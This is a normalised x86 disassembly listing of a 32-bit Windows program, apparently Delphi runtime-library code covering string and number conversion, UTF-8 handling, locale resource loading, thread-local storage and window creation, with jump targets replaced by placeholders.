inc ebp
inc ebp
cmp [ esi + ebp - 0x1 ] 0x30
jne r-xdata
mov edi eax
and edi 0xff
sub edi 0x30
jmp r-xdata
add dl 0xf9
sub dl 0x6
jb r-xdata
mov al [ esi + ebp - 0x1 ]
mov edx eax
add dl 0xd0
sub dl 0xa
jae r-xdata
mov al [ esi + ebp ]
call sub_402970
cmp al 0x58
jne r-xdata
cmp [ esp + 0xc ] 0x0
jne r-xdata
mov edi eax
and edi 0xff
sub edi 0x37
jmp r-xdata
add dl 0xe6
sub dl 0x6
jb r-xdata
cmp [ esp + 0x10 ] 0x0
je r-xdata
mov edi eax
and edi 0xff
sub edi 0x30
cmp [ esp + 0xc ] 0x0
jne r-xdata
jl r-xdata
cmp [ esp + 0x8 ] 0x0
jb r-xdata
mov edi eax
and edi 0xff
sub edi 0x57
jmp r-xdata
cmp [ esp + 0xc ] 0x0
jne r-xdata
mov eax [ esp + 0x8 ]
mov edx [ esp + 0xc ]
neg eax
adc edx 0x0
neg edx
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
jl r-xdata
cmp [ esp + 0x8 ] 0x0
jb r-xdata
cmp [ esp + 0x10 ] 0x0
je r-xdata
cmp [ esp + 0xc ] 0xfffffff
jne r-xdata
jmp r-xdata
je r-xdata
cmp [ esp + 0x8 ] 0x0
cmp [ esp + 0xc ] 0xccccccc
jne r-xdata
jmp r-xdata
cmp [ esi + ebp - 0x1 ] 0x0
setne al
or bl al
je r-xdata
mov eax [ esp + 0x8 ]
mov edx [ esp + 0xc ]
neg eax
adc edx 0x0
neg edx
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
jmp r-xdata
jg r-xdata
cmp [ esp + 0x8 ] 0xffffffff
jbe r-xdata
cmp [ esp + 0xc ] 0x0
jne r-xdata
jg r-xdata
cmp [ esp + 0x8 ] 0xcccccccc
jbe r-xdata
mov eax [ esp ]
xor edx edx
mov [ eax ] edx
mov eax [ esp ]
mov [ eax ] ebp
jmp r-xdata
mov eax edi
cdq
push edx
push eax
mov eax [ esp + 0x10 ]
mov edx [ esp + 0x14 ]
shld edx eax 0x4
shl eax 0x4
add eax [ esp ]
adc edx [ esp + 0x4 ]
add esp 0x8
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
inc ebp
xor ebx ebx
jmp r-xdata
jmp r-xdata
setl al
cmp [ esp + 0x8 ] 0x0
setb al
jmp r-xdata
push 0x0
push 0xa
mov eax [ esp + 0x10 ]
mov edx [ esp + 0x14 ]
call sub_404c94
push edx
push eax
mov eax edi
cdq
add eax [ esp ]
adc edx [ esp + 0x4 ]
add esp 0x8
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
inc ebp
xor ebx ebx
jmp r-xdata
jmp r-xdata
mov al [ esi + ebp - 0x1 ]
mov edx eax
add dl 0xd0
sub dl 0xa
jb r-xdata
dec ebp
cmp al [ esp + 0x10 ]
je r-xdata
sub_404f18
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp - 0x4 ]
mov ebx [ ebx ]
mov eax [ ebp + 0x8 ]
mov edi [ eax ]
test edi edi
jg r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
test ebx ebx
je r-xdata
test edi edi
jge r-xdata
xor eax eax
mov al [ esi + 0x1 ]
add esi eax
mov eax esi
mov edx [ eax + 0x2 ]
mov [ ebp - 0x18 ] edx
mov edx [ eax + 0x6 ]
test edx edx
je r-xdata
sub ebx 0x4
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
sub ebx 0x4
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_404f10
jmp r-xdata
mov al 0x4
call sub_402890
xor esi esi
mov esi [ edx ]
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
add [ ebp - 0x1c ] 0x8
test ebx ebx
je r-xdata
mov al 0x4
call sub_402890
mov eax edi
imul [ ebp - 0x18 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x1c ]
cdq
idiv edi
cmp eax [ ebp - 0x18 ]
je r-xdata
mov [ ebp - 0x20 ] ebx
cmp edi [ ebp - 0x10 ]
jge r-xdata
cmp [ ebx ] 0x1
jne r-xdata
lea eax [ ebp - 0x20 ]
mov edx [ ebp - 0x1c ]
call sub_402774
mov ebx [ ebp - 0x20 ]
jmp r-xdata
test esi esi
je r-xdata
dec [ ebx ]
mov eax [ ebp - 0x1c ]
call sub_402734
mov ebx eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x14 ] eax
cmp edi [ ebp - 0x14 ]
jge r-xdata
mov [ ebx ] 0x1
add ebx 0x4
mov [ ebx ] edi
add ebx 0x4
mov edx edi
sub edx [ ebp - 0x10 ]
imul edx [ ebp - 0x18 ]
mov eax [ ebp - 0x18 ]
imul eax [ ebp - 0x10 ]
add eax ebx
xor ecx ecx
call sub_402b78
cmp [ ebp - 0x8 ] 0x1
jle r-xdata
mov eax ebx
add eax 0x8
mov edx edi
imul edx [ ebp - 0x18 ]
add eax edx
mov ecx [ ebp - 0x10 ]
sub ecx edi
mov edx esi
call j_sub_404918
test esi esi
je r-xdata
mov [ ebp - 0x14 ] edi
mov eax [ ebp - 0x4 ]
mov [ eax ] ebx
add [ ebp + 0x8 ] 0x4
dec [ ebp - 0x8 ]
dec edi
test edi edi
jl r-xdata
mov ecx [ ebp - 0x14 ]
imul ecx [ ebp - 0x18 ]
mov edx ebx
add edx 0x8
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_402930
mov edx [ ebp - 0x14 ]
imul edx [ ebp - 0x18 ]
mov eax ebx
add eax 0x8
xor ecx ecx
call sub_402b78
mov eax [ ebp - 0x14 ]
push eax
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
mov eax ebx
add eax 0x8
mov ecx esi
call sub_404ef8
jmp r-xdata
inc edi
mov [ ebp - 0xc ] 0x0
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0xc ]
lea eax [ ebx + eax * 4 ]
mov ecx [ ebp - 0x8 ]
mov edx esi
call sub_404f18
inc [ ebp - 0xc ]
dec edi
jne r-xdata
sub_4050b0
mov ecx [ eax ]
test ecx ecx
je r-xdata
retn
mov [ eax ] 0x0
[ ecx - 0x8 ]
jne r-xdata
push eax
mov eax ecx
xor ecx ecx
mov cl [ edx + 0x1 ]
mov edx [ ecx + edx + 0x6 ]
test edx edx
je r-xdata
sub eax 0x8
call sub_402754
pop eax
mov ecx [ eax - 0x4 ]
test ecx ecx
je r-xdata
mov edx [ edx ]
call sub_404918
sub_4050ec
push ebx
mov ebx [ eax ]
test edx edx
je r-xdata
test ebx ebx
je r-xdata
[ edx - 0x8 ]
mov [ eax ] edx
pop ebx
retn
[ ebx - 0x8 ]
jne r-xdata
push eax
push edx
mov edx ecx
inc [ ebx - 0x8 ]
call sub_4050b0
pop edx
pop eax
sub_405114
add esp 0xffffffe4
push 0x1c
lea edx [ esp + 0x4 ]
push edx
push eax
call sub_401344
cmp [ esp + 0x10 ] 0x1000
jne r-xdata
xor eax eax
mov eax [ esp + 0x4 ]
jmp r-xdata
add esp 0x1c
retn
sub_405144
push ebx
push esi
add esp 0xfffffef8
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
mov eax [ ebx + 0x10 ]
add esp 0x108
pop esi
pop ebx
retn
push 0x105
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call sub_4012d4
mov eax esp
mov dl 0x1
call sub_405380
mov esi eax
mov [ ebx + 0x10 ] esi
test esi esi
jne r-xdata
mov eax [ ebx + 0x4 ]
mov [ ebx + 0x10 ] eax
sub_40518c
mov edx [ rw-data ]
test edx edx
je r-xdata
retn
cmp eax [ edx + 0x4 ]
je r-xdata
mov eax edx
call sub_405144
retn
cmp eax [ edx + 0x8 ]
je r-xdata
cmp eax [ edx + 0xc ]
jne r-xdata
mov edx [ edx ]
test edx edx
jne r-xdata
sub_4051c8
push ebp
mov ebp esp
add esp 0xfffffdb0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
push r-xdata
call sub_4012dc
mov esi eax
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x5c
jne r-xdata
push r-xdata
push esi
call sub_4012e4
mov ebx eax
test ebx ebx
je r-xdata
mov esi [ ebp - 0x4 ]
add esi 0x2
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1 ] 0x5c
jne r-xdata
push 0x105
lea eax [ ebp - 0x24f ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call ebx
test eax eax
je r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
add eax 0x2
call sub_4051b4
mov esi eax
cmp [ esi ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x24f ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call lstrcpynA
jmp r-xdata
lea eax [ esi + 0x1 ]
call sub_4051b4
mov edi eax
mov eax edi
sub eax esi
mov edx eax
add edx ebx
inc edx
cmp edx 0x105
jg r-xdata
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x24f ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call lstrcpynA
lea eax [ esi + 0x1 ]
call sub_4051b4
mov esi eax
cmp [ esi ] 0x0
je r-xdata
inc eax
push eax
push esi
lea eax [ ebp - 0x24f ]
add eax ebx
push eax
call lstrcpynA
lea eax [ ebp - 0x14a ]
push eax
lea eax [ ebp - 0x24f ]
push eax
call FindFirstFileA
mov esi eax
cmp esi 0xffffffff
je r-xdata
jmp r-xdata
push esi
call FindClose
lea eax [ ebp - 0x11e ]
push eax
call lstrlenA
lea edx [ ebx + 0x1 ]
add eax edx
inc eax
cmp eax 0x105
jg r-xdata
mov ebx esi
sub ebx [ ebp - 0x4 ]
lea eax [ ebx + 0x1 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x24f ]
push eax
call lstrcpynA
jmp r-xdata
mov [ ebp + ebx - 0x24f ] 0x5c
mov eax 0x105
sub eax ebx
dec eax
push eax
lea eax [ ebp - 0x11e ]
push eax
lea eax [ ebp - 0x24f ]
add eax ebx
inc eax
push eax
call lstrcpynA
lea eax [ ebp - 0x11e ]
push eax
call lstrlenA
inc eax
add ebx eax
mov esi edi
sub_405380
push ebp
mov ebp esp
add esp 0xfffffee0
push ebx
push esi
mov [ ebp - 0x4 ] eax
push 0x105
lea eax [ ebp - 0x11d ]
push eax
push 0x0
call sub_4012d4
mov [ ebp - 0x12 ] 0x0
lea eax [ ebp - 0x8 ]
push eax
push 0xf0019
push 0x0
push r-xdata
push 0x80000001
call sub_40132c
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_405485
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x18 ] 0x5
lea eax [ ebp - 0x11d ]
mov edx 0x105
call sub_4051c8
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x12 ]
push eax
push 0x0
push 0x0
lea eax [ ebp - 0x11d ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call sub_401334
test eax eax
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
push 0xf0019
push 0x0
push r-xdata
push 0x80000002
call sub_40132c
test eax eax
je r-xdata
mov [ ebp - 0xe ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
call sub_401324
retn
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x12 ]
push eax
push 0x0
push 0x0
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
call sub_401334
test eax eax
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
push 0xf0019
push 0x0
push r-xdata
push 0x80000001
call sub_40132c
test eax eax
jne r-xdata
mov [ ebp - 0x12 ] 0x0
push 0x105
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x11d ]
push eax
call lstrcpynA
push 0x5
lea eax [ ebp - 0xd ]
push eax
push 0x3
call sub_4012f4
push eax
call sub_4012cc
xor esi esi
cmp [ ebp - 0x11d ] 0x0
je r-xdata
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebp - 0xd ] 0x0
jne r-xdata
lea eax [ ebp - 0x11d ]
push eax
call lstrlenA
mov ebx eax
lea eax [ ebp - 0x11d ]
add ebx eax
jmp r-xdata
cmp [ ebp - 0x12 ] 0x0
je r-xdata
cmp [ ebx ] 0x2e
je r-xdata
lea eax [ ebp - 0x11d ]
cmp ebx eax
je r-xdata
lea eax [ ebp - 0x11d ]
cmp ebx eax
jne r-xdata
inc ebx
cmp [ ebp - 0x12 ] 0x0
je r-xdata
dec ebx
test esi esi
jne r-xdata
mov edx ebx
sub edx eax
mov eax 0x105
sub eax edx
push eax
lea eax [ ebp - 0x12 ]
push eax
push ebx
call lstrcpynA
push 0x2
push 0x0
lea eax [ ebp - 0x11d ]
push eax
call LoadLibraryExA
mov esi eax
cmp [ ebp - 0xd ] 0x0
je r-xdata
lea eax [ ebp - 0x11d ]
mov edx ebx
sub edx eax
mov eax 0x105
sub eax edx
push eax
lea eax [ ebp - 0xd ]
push eax
push ebx
call lstrcpynA
push 0x2
push 0x0
lea eax [ ebp - 0x11d ]
push eax
call LoadLibraryExA
mov esi eax
test esi esi
jne r-xdata
mov [ ebp - 0xb ] 0x0
lea eax [ ebp - 0x11d ]
mov edx ebx
sub edx eax
mov eax 0x105
sub eax edx
push eax
lea eax [ ebp - 0xd ]
push eax
push ebx
call lstrcpynA
push 0x2
push 0x0
lea eax [ ebp - 0x11d ]
push eax
call LoadLibraryExA
mov esi eax
sub_405620
push ebx
push esi
mov esi [ rw-data ]
test esi esi
je r-xdata
mov edx esi
test edx edx
je r-xdata
mov edx [ esi + 0x4 ]
cmp edx eax
jne r-xdata
pop esi
pop ebx
retn
mov ecx [ edx ]
test ecx ecx
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov [ rw-data ] eax
mov edx 0x8
mov eax esi
call sub_402754
pop esi
pop ebx
retn
mov edx [ edx ]
test edx edx
jne r-xdata
mov ebx [ ecx + 0x4 ]
cmp ebx eax
jne r-xdata
mov esi ecx
mov eax [ ecx ]
mov [ edx ] eax
mov edx 0x8
mov eax esi
call sub_402754
jmp r-xdata
sub_405680
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
xor eax eax
push ebp
push sub_4056bb
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call [ ebx + 0x4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
sub_4056ec
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_405750
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_405680
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405757
mov eax [ ebp - 0x4 ]
cmp eax [ rw-data ]
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov [ rw-data ] eax
jmp r-xdata
retn
mov edx [ eax ]
cmp edx [ ebp - 0x4 ]
jne r-xdata
mov eax [ eax ]
test eax eax
jne r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
mov [ eax ] edx
jmp r-xdata
sub_405774
test edx edx
je r-xdata
mov ecx [ eax ]
test ecx ecx
mov [ eax ] edx
je r-xdata
push edx
push eax
mov eax [ edx ]
push edx
call [ eax + 0x4 ]
pop eax
mov ecx [ eax ]
pop [ eax ]
test ecx ecx
jne r-xdata
retn
mov eax [ ecx ]
push ecx
call [ eax + 0x8 ]
mov eax [ ecx ]
push ecx
call [ eax + 0x8 ]
retn
retn
sub_4057a0
test edx edx
je sub_40575c
push edi
mov edi eax
push 0x0
push esp
push ecx
push edx
mov eax [ edx ]
call [ eax ]
test eax eax
je r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
mov al 0x17
jmp sub_402890
pop eax
mov [ edi ] eax
pop edi
retn
push eax
mov eax [ eax ]
call [ eax + 0x8 ]
sub_405808
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_403218
test al al
je r-xdata
mov eax 0x80004002
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0xc
sub_405844
push ebp
mov ebp esp
push ebx
push esi
mov ebx [ ebp + 0x8 ]
lea eax [ ebx + 0x4 ]
push eax
call InterlockedDecrement
mov esi eax
test esi esi
jne r-xdata
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x4 ]
sub_40586c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
xor edx edx
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax edx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
xor esi esi
xor ecx ecx
test eax eax
je r-xdata
cmp ecx [ ebp + 0x8 ]
jae r-xdata
jmp r-xdata
lea edx [ esi + 0x1 ]
mov eax [ ebp - 0x8 ]
movzx edx [ eax + ecx * 2 ]
inc ecx
cmp edx 0x7f
jbe r-xdata
cmp ecx [ ebp + 0x8 ]
jae r-xdata
inc esi
cmp ecx [ ebp + 0x8 ]
jb r-xdata
cmp edx 0x7ff
jbe r-xdata
cmp esi [ ebp - 0x4 ]
jb r-xdata
cmp esi [ ebp - 0x4 ]
jb r-xdata
inc esi
inc esi
mov [ eax + esi ] 0x0
jmp r-xdata
mov esi [ ebp - 0x4 ]
dec esi
mov edx [ ebp - 0x8 ]
movzx edx [ edx + ecx * 2 ]
inc ecx
cmp edx 0x7f
ja r-xdata
cmp edx 0x7ff
jbe r-xdata
mov [ eax + esi ] dl
inc esi
jmp r-xdata
lea ebx [ esi + 0x2 ]
cmp ebx [ ebp - 0x4 ]
ja r-xdata
lea ebx [ esi + 0x3 ]
cmp ebx [ ebp - 0x4 ]
ja r-xdata
mov ebx edx
shr ebx 0x6
or bl 0xc0
mov [ eax + esi ] bl
and dl 0x3f
or dl 0x80
mov [ eax + esi + 0x1 ] dl
add esi 0x2
mov ebx edx
shr ebx 0xc
or bl 0xe0
mov [ eax + esi ] bl
mov ebx edx
shr ebx 0x6
and bl 0x3f
or bl 0x80
mov [ eax + esi + 0x1 ] bl
and dl 0x3f
or dl 0x80
mov [ eax + esi + 0x2 ] dl
add esi 0x3
jmp r-xdata
sub_405948
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov [ ebp - 0x10 ] 0xffffffff
xor eax eax
xor esi esi
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
jmp r-xdata
mov eax [ ebp - 0x10 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
inc eax
mov [ ebp - 0x10 ] eax
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
test dl 0x80
je r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
inc eax
cmp esi [ ebp + 0x8 ]
jb r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
cmp eax [ ebp - 0x8 ]
jb r-xdata
cmp eax [ ebp - 0x8 ]
jb r-xdata
and dl 0x3f
test dl 0x20
je r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + eax * 2 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x8 ]
dec eax
mov edx [ ebp - 0xc ]
xor ecx ecx
mov cl [ edx + esi ]
inc esi
test cl 0x80
je r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
and dl 0xc0
cmp dl 0x80
jne r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
and dl 0xc0
cmp dl 0x80
jne r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + eax * 2 ] cx
cmp esi [ ebp + 0x8 ]
jae r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
and ecx 0x3f
test cl 0x20
je r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
mov ebx edx
and bl 0xc0
cmp bl 0x80
jne r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
mov ebx edx
and bl 0xc0
cmp bl 0x80
jne r-xdata
and dl 0x3f
and edx 0xff
shl ecx 0x6
or dx cx
mov ecx [ ebp - 0x4 ]
mov [ ecx + eax * 2 ] dx
jmp r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
inc eax
and dl 0x3f
and edx 0xff
shl ecx 0x6
or edx ecx
mov ecx edx
sub_405a80
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_405b1f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_403e9c
mov eax ebx
xor edx edx
call sub_4046f4
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405b26
lea eax [ ebp - 0x4 ]
call sub_403e9c
retn
mov eax ebx
call sub_4046e8
lea edx [ eax + eax * 2 ]
lea eax [ ebp - 0x4 ]
call sub_4044e8
mov eax ebx
call sub_4046e8
push eax
mov eax [ ebp - 0x4 ]
call sub_40415c
inc eax
push eax
mov eax ebx
call sub_4046d8
push eax
mov eax [ ebp - 0x4 ]
call sub_40435c
pop ecx
pop edx
call sub_40586c
test eax eax
jle r-xdata
lea eax [ ebp - 0x4 ]
call sub_403e9c
mov edx eax
dec edx
lea eax [ ebp - 0x4 ]
call sub_4044e8
jmp r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_403ef0
sub_405b2c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_405bc3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_40457c
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405bca
lea eax [ ebp - 0x4 ]
call sub_40457c
retn
mov eax ebx
call sub_40415c
mov edx eax
lea eax [ ebp - 0x4 ]
call sub_4047c4
mov eax ebx
call sub_40415c
push eax
mov eax [ ebp - 0x4 ]
call sub_4046e8
inc eax
push eax
mov eax ebx
call sub_40435c
push eax
mov eax [ ebp - 0x4 ]
call sub_4046d8
pop ecx
pop edx
call sub_405948
test eax eax
jle r-xdata
lea eax [ ebp - 0x4 ]
call sub_40457c
mov edx eax
dec edx
lea eax [ ebp - 0x4 ]
call sub_4047c4
jmp r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_4045b8
sub_405bd0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_405c13
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_4046c8
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_405a80
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405c1a
lea eax [ ebp - 0x4 ]
call sub_40457c
retn
sub_405c20
push ebx
push esi
add esp 0xfffffc00
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
add esp 0x400
pop esi
pop ebx
retn
cmp [ ebx + 0x4 ] 0x10000
jge r-xdata
mov eax esi
mov edx [ ebx + 0x4 ]
call sub_404094
push 0x400
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx ]
mov eax [ eax ]
call sub_40518c
push eax
call sub_401304
mov ecx eax
mov edx esp
mov eax esi
call sub_403f8c
jmp r-xdata
sub_405c78
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor edx edx
mov [ ebp - 0x10 ] edx
xor edx edx
push ebp
push sub_405cde
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x7
lea edx [ ebp - 0xb ]
push edx
push 0x1004
push eax
call sub_4012cc
lea eax [ ebp - 0x10 ]
lea edx [ ebp - 0xb ]
mov ecx 0x7
call sub_40410c
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0x4 ]
call sub_402b98
mov ebx eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405ce5
lea eax [ ebp - 0x10 ]
call sub_403e9c
retn
xor ebx ebx
sub_405cec
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_405d36
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405d3d
retn
mov eax rw-data
call sub_402a10
mov eax rw-data
call sub_402a10
mov eax rw-data
call sub_402a10
call sub_401b38
sub_405d40
sub [ rw-data ] 0x1
jae r-xdata
retn
mov [ rw-data ] 0x2
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] 0x2
mov [ rw-data ] sub_404c8c
call sub_402fa4
test al al
je r-xdata
call sub_403098
mov [ rw-data ] 0xd7b0
mov [ rw-data ] 0xd7b0
mov [ rw-data ] 0xd7b0
call GetCommandLineA
mov [ rw-data ] eax
call sub_401384
mov [ rw-data ] eax
call sub_40137c
and eax 0x80000000
cmp eax 0x80000000
je r-xdata
call sub_402fd4
call sub_4012f4
call sub_405c78
mov [ rw-data ] eax
call sub_40137c
and eax 0xff
cmp ax 0x4
jbe r-xdata
call sub_4012f4
call sub_405c78
mov [ rw-data ] eax
jmp r-xdata
mov [ rw-data ] 0x3
jmp r-xdata
call sub_401374
mov [ rw-data ] eax
sub_405e48
push ebx
call sub_405e40
mov ebx eax
test ebx ebx
je r-xdata
pop ebx
retn
cmp [ rw-data ] 0xffffffff
jne r-xdata
mov eax ebx
call sub_405e34
test eax eax
jne r-xdata
mov eax 0xe2
call sub_403e90
push eax
mov eax [ rw-data ]
push eax
call TlsSetValue
mov eax 0xe2
call sub_403e90
sub_405e8c
mov cl [ rw-data ]
mov eax [ rw-data ]
test cl cl
jne r-xdata
push eax
call TlsGetValue
test eax eax
je r-xdata
mov edx [ fs : 0x2c ]
mov eax [ edx + eax * 4 ]
retn
call sub_405e48
mov eax [ rw-data ]
push eax
call TlsGetValue
test eax eax
je r-xdata
retn
mov eax [ rw-data ]
retn
retn
sub_405ed8
push ebx
mov ebx eax
xor eax eax
mov [ rw-data ] eax
push 0x0
call sub_405e14
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
call sub_405ecc
mov edx rw-data
mov eax ebx
call sub_403be4
pop ebx
retn
sub_405f1c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_405f41
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405f48
retn
sub_405f78
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov [ ebx ] eax
mov [ ebx + 0x4 ] edx
add ecx eax
mov [ ebx + 0x8 ] ecx
add edx [ ebp + 0xc ]
mov [ ebx + 0xc ] edx
pop ebx
pop ebp
retn 0x8
sub_405f94
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_405fb9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405fc0
retn
sub_406a30
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
call sub_40298c
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
push esi
call CreateWindowExA
mov esi eax
mov eax ebx
call sub_40297c
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x24
sub_406a88
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
call sub_40298c
